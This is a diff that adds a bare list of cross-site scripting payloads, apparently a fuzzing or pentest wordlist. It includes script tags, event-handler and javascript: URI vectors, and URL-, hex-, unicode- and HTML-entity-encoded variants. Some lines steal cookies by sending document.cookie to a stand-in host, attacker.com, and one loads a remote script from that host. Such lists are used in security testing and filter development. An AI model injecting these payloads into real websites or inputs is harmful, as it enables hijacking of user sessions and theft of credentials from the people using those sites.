@@ -1,0 +1,51 @@
+<script>alert(1)</script>
+<script>alert('DARKWIN')</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<a href="javascript:alert(1)">Click Me</a>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus></textarea>
+<select onfocus=alert(1) autofocus></select>
+<keygen onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><input type=submit></form>
+<table background="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<style>@import 'javascript:alert(1)';</style>
+<div style="width:expression(alert(1));">
+<xss style="behavior:url(xss.htc);">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1);">
+<link rel="stylesheet" href="javascript:alert(1);">
+<vmlframe src="javascript:alert(1)">
+<bgsound src="javascript:alert(1)">
+<xml src="javascript:alert(1)">
+<nextid src="javascript:alert(1)">
+<anchor href="javascript:alert(1)">
+<comment>
+<p><p>
+<math><mtext><option><desc><xmp>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>location='http://attacker.com/log?c='+document.cookie</script>
+<script>fetch('http://attacker.com/log?c='+document.cookie)</script>
+<script>eval(atob('YWxlcnQoJ0RBUktXSU4nKQ=='))</script>
+<script src="http://attacker.com/xss.js"></script>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+%27%3E%3Cscript%3Ealert(1)%3C/script%3E
+\x22\x3E\x3Cscript\x3Ealert(1)\x3C/script\x3E
+\u0022\u003E\u003Cscript\u003Ealert(1)\u003C/script\u003E
+&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&#34;&#62;&#60;script&#62;alert(1)&#60;&#47;script&#62;
+&#x22;&#x3e;&#x3c;script&#x3e;alert(1)&#x3c;&#x2f;script&#x3e;
